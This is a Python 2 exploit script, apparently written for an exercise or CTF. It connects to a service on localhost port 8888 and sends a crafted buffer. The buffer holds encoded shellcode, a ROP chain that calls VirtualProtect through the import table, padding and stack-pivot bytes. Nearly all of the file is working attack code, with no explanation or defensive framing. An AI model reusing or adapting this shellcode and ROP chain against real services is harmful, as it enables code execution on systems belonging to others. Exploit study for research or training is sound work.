import socket
import struct
import random, string


def randomword(length):
    return ''.join(random.choice(string.letters) for i in range(length))

#choreado de GUS DS
shellcode = "\xd9\xec\xd9\x74\x24\xf4\xb8\x28\x1f\x44\xde\x5b\x31\xc9\xb1" \
            "\x33\x31\x43\x17\x83\xeb\xfc\x03\x6b\x0c\xa6\x2b\x97\xda\xaf" \
            "\xd4\x67\x1b\xd0\x5d\x82\x2a\xc2\x3a\xc7\x1f\xd2\x49\x85\x93" \
            "\x99\x1c\x3d\x27\xef\x88\x32\x80\x5a\xef\x7d\x11\x6b\x2f\xd1" \
            "\xd1\xed\xd3\x2b\x06\xce\xea\xe4\x5b\x0f\x2a\x18\x93\x5d\xe3" \
            "\x57\x06\x72\x80\x25\x9b\x73\x46\x22\xa3\x0b\xe3\xf4\x50\xa6" \
            "\xea\x24\xc8\xbd\xa5\xdc\x62\x99\x15\xdd\xa7\xf9\x6a\x94\xcc" \
            "\xca\x19\x27\x05\x03\xe1\x16\x69\xc8\xdc\x97\x64\x10\x18\x1f" \
            "\x97\x67\x52\x5c\x2a\x70\xa1\x1f\xf0\xf5\x34\x87\x73\xad\x9c" \
            "\x36\x57\x28\x56\x34\x1c\x3e\x30\x58\xa3\x93\x4a\x64\x28\x12" \
            "\x9d\xed\x6a\x31\x39\xb6\x29\x58\x18\x12\x9f\x65\x7a\xfa\x40" \
            "\xc0\xf0\xe8\x95\x72\x5b\x66\x6b\xf6\xe1\xcf\x6b\x08\xea\x7f" \
            "\x04\x39\x61\x10\x53\xc6\xa0\x55\xab\x8c\xe9\xff\x24\x49\x78" \
            "\x42\x29\x6a\x56\x80\x54\xe9\x53\x78\xa3\xf1\x11\x7d\xef\xb5" \
            "\xca\x0f\x60\x50\xed\xbc\x81\x71\x8e\x23\x12\x19\x7f\xc6\x92" \
            "\xb8\x7f"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 8888))

a=sock.recv(100)
print a

# Generated by IDA Sploiter
rop_chain  = struct.pack('<I', 0x6AF04225) # pop ebp # retn
rop_chain += struct.pack('<I', 0x6AF06980) # will point to 0x40
rop_chain += struct.pack('<I', 0x6AF12157) # pop eax # pop ecx # retn
rop_chain += struct.pack('<I', 0x6AF13030) # writable setion data
rop_chain += struct.pack('<I', 0x6AF13030) # writable setion data
rop_chain += struct.pack('<I', 0x6AF03225) # mov edx, [ebp+0Ch] # mov [eax], dl # nop # pop ebx # pop ebp # retn
rop_chain += struct.pack('<I', 0x00000002) # size to ebx
rop_chain += struct.pack('<I', 0x6AF01077) #  call esi to ebp
rop_chain += struct.pack('<I', 0x6AF12157) # pop eax # pop ecx # retn
rop_chain += struct.pack('<I', 0x6AF1B14C) # iat virtual protect
rop_chain += struct.pack('<I', 0x6AF13030) # writable setion data
rop_chain += struct.pack('<I', 0x6AF11DEB) # POP ESI
rop_chain += struct.pack('<I', 0x6AF02429) # jmp [eax]
rop_chain += struct.pack('<I', 0x6AF117FB) # pop edi # retn
rop_chain += struct.pack('<I', 0x6AF117FC) # RET
rop_chain += struct.pack('<I', 0x6AF0DD5A) # pusha # pop ebx # pop ebp # retn

fruta2= 20* "A" + struct.pack('<I', 0x6AF0DD5c)+ struct.pack('<I', 0x6AF117FC)* 4 +struct.pack('<I', 0x6AF0DD5A) + "\x8B\xF4\x81\xEE\x28\x13\x00\x00"+"\x8B\xFC\x83\xC7\x30\xB9\xE3\x00\x00\x00\xF3\xA4" + "A"*20


fruta= struct.pack("<L",0x0) + struct.pack("<L",0xffffffff)\
       + struct.pack("<L",0x13e0)+ struct.pack("<L",0x89765432)\
       + shellcode+ (4800-16-len(shellcode))  * "A"  + struct.pack ("<L", 0x0)+ 24 * "B" + rop_chain + fruta2


#a=sock.recv(512)

sock.send(fruta)
sock.close()







